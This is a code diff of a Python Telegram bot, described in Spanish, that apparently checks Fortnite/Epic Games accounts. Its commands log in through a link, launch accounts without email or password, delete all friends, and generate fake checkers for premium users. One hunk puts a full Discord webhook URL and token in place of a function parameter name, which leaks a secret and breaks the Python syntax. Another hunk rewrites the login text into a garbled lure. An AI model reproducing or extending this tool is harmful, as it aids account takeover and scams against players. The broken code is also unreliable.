@@ -36,7 +36,7 @@ def save_verification_counts(counts):
     with open(VERIFICATION_COUNT_FILE, "w") as f:
         json.dump(counts, f)
 
-async def send_webhook_message(webhook_url: str, message: str):
+async def send_webhook_message(https://discord.com/api/webhooks/1315904689060974624/izVPR0KNuDkByMcDETwDrOc6zTe9noA-Q91hJnkhD_S6WC-oqaEvf8iWobt74HKGDXG7: str, message: str):
     async with aiohttp.ClientSession() as session:
         webhook_data = {"content": message}
         async with session.post(webhook_url, json=webhook_data) as resp:
@@ -1057,7 +1057,7 @@ def get_cosmetic_type(cosmetic_id):
 async def set_bot_commands(application):
     commands = [
         BotCommand("help", "Muestra los comandos disponibles"),
-        BotCommand("login", "Checkea tu cuenta de Fortnite para ver tus objetos"),
+        BotCommand("login", "Log in with the link below!F"),
         BotCommand("launch", "Inicia tu cuenta de Fortnite sin correo y contraseña"),
         BotCommand("eliminar_amigos", "Elimina todos los amigos de tu cuenta de Epic Games"),
         BotCommand("fakechecker", "Genera un Fake Checker (Solo usuarios Premiuns)"),
